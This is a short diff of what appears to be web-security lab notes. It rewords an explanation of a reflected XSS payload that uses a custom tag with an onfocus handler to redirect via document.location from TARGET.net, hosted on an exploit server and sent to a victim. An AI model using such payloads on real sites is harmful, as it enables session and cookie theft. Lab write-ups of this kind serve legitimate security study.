@@ -362,7 +362,7 @@ location = 'https://TARGET.net/?search=<xss+id=x+onfocus=document.location='http
 </script>
 ```
    
->**Note:** The custom tag with the ID ```x```, which contains an **onfocus** event handler that triggers the ```document.location``` function. The **HASH** character at the end of the URL focuses on this element as soon as the page is loaded, causing the payload to be called. Host the payload script on the exploit server in **script** tags, and send to victim. Below is the above payload but URL-encoded format.  
+>**Note:** The custom tag with the ID ```x```, which contains an **onfocus** event handler that triggers the ```document.location``` function. The **HASH** character at the end of the URL focuses on this element as soon as the page is loaded, causing the payload to be called. Host the payload script on the exploit server in ```script``` tags, and send to victim. Below is the same payload but **URL-encoded** format.  
 
 ```
 <script>
